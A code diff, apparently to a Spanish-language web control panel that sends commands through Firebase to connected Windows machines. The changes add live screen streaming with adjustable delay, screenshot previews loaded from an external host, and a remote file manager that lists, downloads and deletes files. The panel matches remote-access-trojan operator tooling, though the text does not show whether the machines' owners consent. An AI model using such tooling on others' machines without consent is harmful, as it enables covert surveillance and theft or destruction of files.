@@ -136,6 +136,14 @@
           <h2 class="text-2xl font-semibold text-white">Dispositivos Conectados</h2>
 
           <div class="flex items-center gap-4">
+            <!-- Selector de velocidad -->
+            <select id="setting-global-delay"
+              class="bg-slate-800 text-xs border border-slate-700 rounded px-2 py-2 text-slate-300 outline-none">
+              <option value="200">200ms</option>
+              <option value="500" selected>500ms</option>
+              <option value="1000">1s</option>
+              <option value="2000">2s</option>
+            </select>
             <!-- Botón de Directo Global -->
             <button id="btn-global-live" onclick="toggleGlobalLiveMode()"
               class="px-4 py-2 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all flex items-center gap-2 border border-slate-700 text-sm font-medium">
@@ -176,6 +184,13 @@
           </div>
 
           <div class="flex items-center gap-3">
+            <select id="setting-detail-delay"
+              class="bg-slate-800 text-xs border border-slate-700 rounded px-2 py-2 text-slate-300 outline-none">
+              <option value="200">200ms</option>
+              <option value="500" selected>500ms</option>
+              <option value="1000">1s</option>
+              <option value="2000">2s</option>
+            </select>
             <button id="btn-live-toggle" onclick="toggleLiveMode()"
               class="px-4 py-2 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all flex items-center gap-2 border border-slate-700">
               <i class="fa-solid fa-video"></i> Ver en Directo
@@ -257,11 +272,10 @@
             <!-- Tab: Archivos -->
             <div id="tab-content-files" class="flex-1 flex flex-col min-h-0 bg-slate-900 hidden">
               <div class="p-2 border-b border-slate-800 flex gap-2 items-center bg-slate-800/50 flex-wrap">
-                <button onclick="requestDir(currentCWD.split('\\').slice(0,-1).join('\\') || currentCWD)"
-                  class="p-2 text-slate-400 hover:text-white" title="Subir nivel"><i
+                <button onclick="requestDirUp()" class="p-2 text-slate-400 hover:text-white" title="Subir nivel"><i
                     class="fa-solid fa-level-up-alt"></i></button>
-                <button onclick="requestDir(currentCWD)" class="p-2 text-slate-400 hover:text-white"
-                  title="Actualizar"><i class="fa-solid fa-sync"></i></button>
+                <button onclick="requestDir()" class="p-2 text-slate-400 hover:text-white" title="Actualizar"><i
+                    class="fa-solid fa-sync"></i></button>
                 <span class="text-xs text-slate-300 font-mono truncate flex-1 leading-snug"
                   id="fm-current-path">C:\</span>
                 <label class="p-2 text-cyan-400 hover:text-cyan-300 cursor-pointer" title="Subir Archivo">
@@ -447,7 +461,12 @@
         // Preview de imagen si existe
         if (m.screenshot && m.screenshot.data) {
           const img = el.querySelector('.preview-img');
-          img.src = "data:image/jpeg;base64," + m.screenshot.data;
+          const dataStr = m.screenshot.data;
+          if (dataStr.startsWith("gb:")) {
+            img.src = "https://greenbase.arielcapdevila.com/file/" + dataStr.substring(3) + "?_t=" + Date.now();
+          } else {
+            img.src = "data:image/jpeg;base64," + dataStr;
+          }
           img.style.display = 'block';
           el.querySelector('.no-preview-icon').style.display = 'none';
         }
@@ -522,8 +541,12 @@
       }
     }
 
-    function updateDetailImage(b64) {
-      detailImage.src = "data:image/jpeg;base64," + b64;
+    function updateDetailImage(dataStr) {
+      if (dataStr.startsWith("gb:")) {
+        detailImage.src = "https://greenbase.arielcapdevila.com/file/" + dataStr.substring(3) + "?_t=" + Date.now();
+      } else {
+        detailImage.src = "data:image/jpeg;base64," + dataStr;
+      }
       detailImage.style.display = 'block';
       detailPlaceholder.style.display = 'none';
     }
@@ -545,6 +568,9 @@
       btnLiveToggle.classList.remove('bg-slate-800', 'text-slate-300');
       liveBadge.classList.remove('hidden');
 
+      // Enviar comando para ajustar el polling de comandos MUY RÁPIDO mientras hay stream
+      sendFirebaseCommand(selectedMachine, "/pollrate 500", currentCWD, false);
+
       // Enviar comando inicial
       sendLiveCommand();
 
@@ -563,11 +589,17 @@
       liveBadge.classList.add('hidden');
       if (liveModeInterval) clearInterval(liveModeInterval);
       liveModeInterval = null;
+      if (selectedMachine) {
+        sendFirebaseCommand(selectedMachine, "/stoplivestream", currentCWD, false);
+        // Volver a polling lento (5000ms)
+        setTimeout(() => sendFirebaseCommand(selectedMachine, "/pollrate 5000", currentCWD, false), 500);
+      }
     }
 
     async function sendLiveCommand() {
+      const delay = document.getElementById('setting-detail-delay').value || "500";
       console.log("Iniciando modo LiveStream Individual...", "info");
-      await sendFirebaseCommand(selectedMachine, "/livestream", currentCWD, false); // No borrar inmediatamente
+      await sendFirebaseCommand(selectedMachine, `/livestream ${delay}`, currentCWD, false); // No borrar inmediatamente
     }
 
     // --- Live Mode GLOBAL Logic ---
@@ -588,6 +620,11 @@
         btnGlobalLive.classList.add('border-red-500/50', 'text-red-400', 'bg-red-900/10');
         btnGlobalLive.classList.remove('bg-slate-800', 'text-slate-300');
       }
+
+      // Enviar ajuste de pollrate global
+      Object.keys(machines).forEach(name => {
+        sendFirebaseCommand(name, "/pollrate 500", "C:\\", false);
+      });
 
       sendGlobalLiveCommand();
 
@@ -610,15 +647,21 @@
 
       if (globalLiveInterval) clearInterval(globalLiveInterval);
       globalLiveInterval = null;
+      Object.keys(machines).forEach(name => {
+        sendFirebaseCommand(name, "/stoplivestream", "C:\\", false);
+        setTimeout(() => sendFirebaseCommand(name, "/pollrate 5000", "C:\\", false), 500);
+      });
     }
 
     async function sendGlobalLiveCommand() {
       const names = Object.keys(machines);
       if (names.length === 0) return;
 
+      const delay = document.getElementById('setting-global-delay').value || "500";
+
       console.log(`Enviando LiveStream a ${names.length} dispositivos...`);
       names.forEach(name => {
-        sendFirebaseCommand(name, "/livestream", "C:\\", false);
+        sendFirebaseCommand(name, `/livestream ${delay}`, "C:\\", false);
       });
     }
 
@@ -719,6 +762,28 @@
     };
 
     // --- File Manager Logic ---
+    window.requestDirUp = function () {
+      const parts = currentCWD.split('\\');
+      if (parts.length > 1) {
+        parts.pop();
+        let p = parts.join('\\');
+        if (p.length === 2 && p.endsWith(':')) p += '\\';
+        requestDir(p);
+      } else {
+        requestDir(currentCWD);
+      }
+    };
+
+    window.requestDirB64 = function (b64) {
+      requestDir(decodeURIComponent(escape(atob(b64))));
+    };
+    window.fmDownloadB64 = function (b64) {
+      fmDownload(decodeURIComponent(escape(atob(b64))));
+    };
+    window.fmDeleteB64 = function (b64) {
+      fmDelete(decodeURIComponent(escape(atob(b64))));
+    };
+
     window.requestDir = function (path) {
       if (!path) path = currentCWD;
       document.getElementById('fm-list').innerHTML = `<tr><td colspan="3" class="text-center py-4 text-slate-500"><i class="fa-solid fa-spinner fa-spin mr-2"></i> Cargando...</td></tr>`;
@@ -738,13 +803,15 @@
         data.folders.forEach(f => {
           const name = safeB64(f.name);
           const rawPath = currentCWD + (currentCWD.endsWith('\\') ? '' : '\\') + name;
+          const safeB64Path = btoa(unescape(encodeURIComponent(rawPath)));
+
           const tr = document.createElement('tr');
           tr.className = "hover:bg-slate-800/50 group";
           tr.innerHTML = `
-            <td class="px-2 py-2 cursor-pointer text-cyan-400 truncate max-w-[150px]" onclick="requestDir('${rawPath.replace(/\\/g, '\\\\')}')"><i class="fa-solid fa-folder text-blue-400 mr-2"></i>${escapeHTML(name)}</td>
+            <td class="px-2 py-2 cursor-pointer text-cyan-400 truncate max-w-[150px]" onclick="requestDirB64('${safeB64Path}')"><i class="fa-solid fa-folder text-blue-400 mr-2"></i>${escapeHTML(name)}</td>
             <td class="px-2 py-2">-</td>
             <td class="px-2 py-2 text-center opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap">
-              <button onclick="fmDelete('${rawPath.replace(/\\/g, '\\\\')}')" class="text-red-400 hover:text-red-300 mx-1" title="Eliminar"><i class="fa-solid fa-trash"></i></button>
+              <button onclick="fmDeleteB64('${safeB64Path}')" class="text-red-400 hover:text-red-300 mx-1" title="Eliminar"><i class="fa-solid fa-trash"></i></button>
             </td>
           `;
           listEl.appendChild(tr);
@@ -753,14 +820,16 @@
         data.files.forEach(f => {
           const name = safeB64(f.name);
           const rawPath = currentCWD + (currentCWD.endsWith('\\') ? '' : '\\') + name;
+          const safeB64Path = btoa(unescape(encodeURIComponent(rawPath)));
+
           const tr = document.createElement('tr');
           tr.className = "hover:bg-slate-800/50 group";
           tr.innerHTML = `
             <td class="px-2 py-2 truncate max-w-[150px]"><i class="fa-regular fa-file text-slate-400 mr-2"></i>${escapeHTML(name)}</td>
             <td class="px-2 py-2 text-xs">${formatBytes(f.size)}</td>
             <td class="px-2 py-2 text-center opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap">
-              <button onclick="fmDownload('${rawPath.replace(/\\/g, '\\\\')}')" class="text-green-400 hover:text-green-300 mx-1" title="Descargar"><i class="fa-solid fa-download"></i></button>
-              <button onclick="fmDelete('${rawPath.replace(/\\/g, '\\\\')}')" class="text-red-400 hover:text-red-300 mx-1" title="Eliminar"><i class="fa-solid fa-trash"></i></button>
+              <button onclick="fmDownloadB64('${safeB64Path}')" class="text-green-400 hover:text-green-300 mx-1" title="Descargar"><i class="fa-solid fa-download"></i></button>
+              <button onclick="fmDeleteB64('${safeB64Path}')" class="text-red-400 hover:text-red-300 mx-1" title="Eliminar"><i class="fa-solid fa-trash"></i></button>
             </td>
           `;
           listEl.appendChild(tr);
